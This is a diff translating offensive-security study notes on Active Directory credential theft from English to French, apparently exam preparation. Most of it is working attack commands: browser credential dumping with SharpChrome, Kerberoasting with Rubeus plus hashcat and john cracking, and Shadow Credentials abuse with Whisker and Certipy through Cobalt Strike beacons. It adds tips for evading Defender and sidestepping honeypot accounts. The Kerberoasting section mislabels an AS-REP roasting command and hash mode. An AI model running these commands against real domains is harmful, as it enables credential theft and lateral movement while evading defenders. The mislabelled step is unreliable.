@@ -1,6 +1,6 @@
-# Credential access  
+# Credential Access — Accès aux identifiants  
 
-* Credentials from Web Browsers
+* Récupérer les credentials des navigateurs Web
 ```
 execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
 ```
@@ -14,47 +14,47 @@ execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe crede
 
 ## Kerberoasting
 
-> Request TGS tickets for accounts with SPNs set, crack offline. No LSASS touch, no admin required.
+> Demander des tickets **TGS** pour les comptes disposant d’un **SPN**, puis effectuer le cracking hors ligne. Aucun accès à LSASS ni privilège administrateur requis.
 
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
 ```
 
->Hashcat mode 18200  
+> Mode Hashcat `18200` (AS-REP Roasting).  
 
 ```
 .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
 ```
 
-### Prerequisites
+### Prérequis
 
-- Valid domain user account (any privilege)
-- Target account must have a `servicePrincipalName` set
-- RC4 (type 23) hashes crack fastest — AES-only accounts produce type 18 (slower)
+- Disposer d’un compte utilisateur du domaine valide, même sans privilège particulier.
+- Le compte cible doit avoir un attribut `servicePrincipalName` renseigné.
+- Les hashes **RC4** (type 23) sont généralement plus rapides à cracker ; les comptes AES-only produisent un type 18, plus lent.
 
 ---
 
-### Step 1 — Pre-Enumeration (Confirm SPN before attacking)
+### Étape 1 — Pré-énumération des SPN
 
-> **Honeypot Warning:** Exam environments may contain honey accounts with SPNs set as traps.
-> Always enumerate ALL kerberoastable accounts first — identify suspicious service accounts
-> (generic names, never logged in, description says "do not use") and **skip them**.
-> Roasting a honeypot account will trigger alerts and cost OPSEC points.
+> **Attention aux honeypots :** les environnements d’examen peuvent contenir des comptes leurres avec un SPN.
+> Énumérer d’abord tous les comptes **kerberoastable**, puis identifier les comptes de service suspects
+> (nom générique, absence de connexion, description « do not use ») et **les exclure**.
+> Un Kerberoasting sur un compte honeypot peut déclencher une alerte et faire perdre des points OPSEC.
 
-#### LDAP Search — OPSEC-SAFE, filters krbtgt + disabled accounts
+#### LDAP Search — OPSEC-SAFE, sans `krbtgt` ni comptes désactivés
 
 ```sh
 // Enumerate all valid kerberoastable accounts — excludes krbtgt and disabled accounts
 ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
 ```
 
-Filter breakdown:
-- `samAccountType=805306368` — user accounts only
-- `servicePrincipalName=*` — SPN must be set
-- `!samAccountName=krbtgt` — exclude krbtgt
-- `UserAccountControl:...=2` — exclude disabled accounts
+Explication des filtres :
+- `samAccountType=805306368` — comptes utilisateurs uniquement
+- `servicePrincipalName=*` — SPN obligatoirement renseigné
+- `!samAccountName=krbtgt` — exclusion du compte `krbtgt`
+- `UserAccountControl:...=2` — exclusion des comptes désactivés
 
-#### Native .NET ADSI — OPSEC-SAFE, no tools required
+#### .NET ADSI natif — OPSEC-SAFE, sans outil externe
 
 ```cs
 // No PowerView, no imports — works on any beacon immediately
@@ -64,7 +64,7 @@ beacon> powerpick ([adsisearcher]"(&(objectCategory=user)(servicePrincipalName=*
 beacon> powerpick ([adsisearcher]"(samaccountname=mssql_svc)").FindOne().Properties | Format-List
 ```
 
-#### PowerView — requires powershell-import first (see below)
+#### PowerView — nécessite d’abord `powershell-import`
 
 ```cs
 beacon> powerpick Get-DomainUser mssql_svc -Properties samaccountname,serviceprincipalname,description
@@ -73,9 +73,9 @@ beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipa
 
 ---
 
-### Step 2 — Load PowerView into Beacon Memory (Exam Day Workflow)
+### Étape 2 — Charger PowerView dans la mémoire du Beacon
 
-**`powershell-import` is the correct CS method — reads from CS client local disk, never writes to target.**
+**`powershell-import`** charge le fichier depuis le disque local du client Cobalt Strike, sans l’écrire sur la cible.
 
 ```cs
 // Step 1 — one-time per beacon session (path = CS client machine filesystem)
@@ -85,7 +85,7 @@ beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
 beacon> powerpick Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
 ```
 
-**Troubleshooting `powershell-import` "not found" error:**
+**Dépannage :** erreur `powershell-import` « not found »
 
 ```
 Cause:   Path in powershell-import refers to CS CLIENT machine, not beacon host
@@ -98,7 +98,7 @@ Avoid:   DO NOT upload PowerView.ps1 to target — .ps1 is heavily signatured, D
 
 ---
 
-### Step 3 — Kerberoast with Rubeus
+### Étape 3 — Kerberoasting avec Rubeus
 
 ```cs
 // OPSEC-SAFE — target specific user, single-line output for submission
@@ -111,7 +111,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoas
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /tgtdeleg /nowrap
 ```
 
-Hash format in output — submit as-is (truncation is accepted by exam portal):
+Format du hash retourné : conserver la sortie telle quelle (les notes indiquent que le portail d’examen accepte la troncature).
 
 ```
 $krb5tgs$23$*mssql_svc$DOMAIN$<SPN>*$<hash>
@@ -119,7 +119,7 @@ $krb5tgs$23$*mssql_svc$DOMAIN$<SPN>*$<hash>
 
 ---
 
-### Crack Offline (Kali)
+### Cracking hors ligne (Kali)
 
 ```bash
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
@@ -128,7 +128,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
 ---
 
-### OPSEC Pre-Check
+### Vérifications OPSEC préalables
 
 ```
 Tier:          SAFE
@@ -144,36 +144,36 @@ Avoid:         shell setspn -Q */* — spawns cmd.exe as beacon child
 Avoid:         Uploading PowerView.ps1 to target disk — Defender flags immediately
 ```
 
-### OPSEC Comparison — Enumeration Methods
+### Comparaison OPSEC des méthodes d’énumération
 
-| Method | Spawns proc | powershell.exe | Writes disk | Defender risk |
+| Méthode | Nouveau processus | powershell.exe | Écriture disque | Risque Defender |
 |--------|-------------|----------------|-------------|---------------|
-| `powerpick` ADSI native .NET | Yes (sacrificial) | No | No | Low |
-| `powershell-import` + `powerpick` PowerView | Yes (sacrificial) | No | No (CS client only) | Low |
-| `execute-assembly` ADSearch | Yes (sacrificial) | No | No | Low |
-| `shell setspn -Q */*` | Yes — cmd.exe child | No | No | HIGH |
-| `upload` PowerView.ps1 + dot-source | Yes | No | YES — target disk | HIGH — instant sig |
+| `powerpick` ADSI .NET natif | Oui (temporaire) | Non | Non | Faible |
+| `powershell-import` + `powerpick` PowerView | Oui (temporaire) | Non | Non (client CS seulement) | Faible |
+| `execute-assembly` ADSearch | Oui (temporaire) | Non | Non | Faible |
+| `shell setspn -Q */*` | Oui — child process `cmd.exe` | Non | Non | Élevé |
+| `upload` PowerView.ps1 + dot-source | Oui | Non | Oui — disque cible | Élevé — signature |
 
 ---
 
 ## Shadow Credentials
 
-> Abuses write access to `msDS-KeyCredentialLink` on AD objects (the same attribute Windows Hello for Business uses). Add your own key credential → authenticate via PKINIT → extract NT hash. No password change, no LSASS touch.
+> Exploite les droits d’écriture sur `msDS-KeyCredentialLink` dans Active Directory (attribut également utilisé par Windows Hello for Business). Ajout d’une clé → authentification **PKINIT** → récupération du hash NT, sans changer le mot de passe ni accéder à LSASS.
 
-### Prerequisites
+### Prérequis
 
-- Write permission on target object's `msDS-KeyCredentialLink`:
+- Disposer d’un droit d’écriture sur l’attribut `msDS-KeyCredentialLink` de l’objet cible :
   `GenericWrite` / `GenericAll` / `WriteProperty` / `WriteDacl` / `WriteOwner`
-- DC must support PKINIT (cert-based Kerberos auth) — standard on most modern domains
-- Domain Functional Level 2016+
+- Le Domain Controller doit prendre en charge **PKINIT** (authentification Kerberos par certificat).
+- Domain Functional Level 2016 ou supérieur.
 
-> BloodHound query to find targets:
+> Requête BloodHound pour trouver les cibles :
 > ```cypher
 > MATCH (n)-[r:GenericWrite]->(m:User) RETURN n,r,m
 > MATCH (n)-[r:GenericWrite]->(m:Computer) RETURN n,r,m
 > ```
 
-### Attack Flow
+### Déroulement de l’attaque
 
 ```
 1. Add attacker key credential → msDS-KeyCredentialLink of target object
@@ -182,7 +182,7 @@ Avoid:         Uploading PowerView.ps1 to target disk — Defender flags immedia
 4. PTH or use TGT directly for lateral movement
 ```
 
-### Execution — CS `OPSEC-CAUTION`
+### Exécution — Cobalt Strike (`OPSEC-CAUTION`)
 
 ```cs
 // Step 1 — add shadow credential (Whisker outputs a ready-to-run Rubeus command)
@@ -199,7 +199,7 @@ beacon> execute-assembly Whisker.exe list /target:targetuser
 beacon> execute-assembly Whisker.exe remove /target:targetuser /deviceid:<guid>
 ```
 
-### Execution — Adaptix / Kali `OPSEC-CAUTION`
+### Exécution — Adaptix / Kali (`OPSEC-CAUTION`)
 
 ```bash
 # Step 1 — add shadow credential
@@ -220,7 +220,7 @@ certipy shadow auto -u attacker@DOMAIN -p 'pass' -account targetuser
 pywhisker.py -d DOMAIN -u attacker -p 'pass' --target targetuser --action remove --device-id <guid>
 ```
 
-### OPSEC Pre-Check
+### Vérifications OPSEC préalables
 
 ```
 Tier:          CAUTION
@@ -236,18 +236,18 @@ Safer alt:     Run from Kali with pyWhisker/Certipy to avoid CS binary on disk
 
 ### Tools
 
-| Tool | Language | Invoke From |
+| Outil | Langage | Exécution depuis |
 |------|----------|-------------|
 | Whisker | C# | `execute-assembly` |
 | pyWhisker | Python | Kali shell |
 | Certipy (`shadow auto`) | Python | Kali shell — all-in-one |
 
-### When to Use
+### Quand utiliser cette technique
 
-- Target user/computer has no SPN (can't Kerberoast) but you have write ACL over them
-- Stealthier than LSASS dumping — no LSASS touch, no service creation
-- Useful when pivoting through misconfigured delegations or owned computer accounts
-- Computer account shadow creds → machine NT hash → RBCD or S4U2Self escalation path
+- L’utilisateur ou l’ordinateur cible n’a pas de SPN, mais un droit d’écriture ACL est disponible sur son objet.
+- N’implique ni dump LSASS ni création de service ; son profil de détection est différent.
+- Utile lors d’un pivoting impliquant des délégations mal configurées ou des comptes machines contrôlés.
+- Shadow Credentials sur un compte machine → hash NT de la machine → chemins RBCD ou S4U2Self.
 
 ---
 
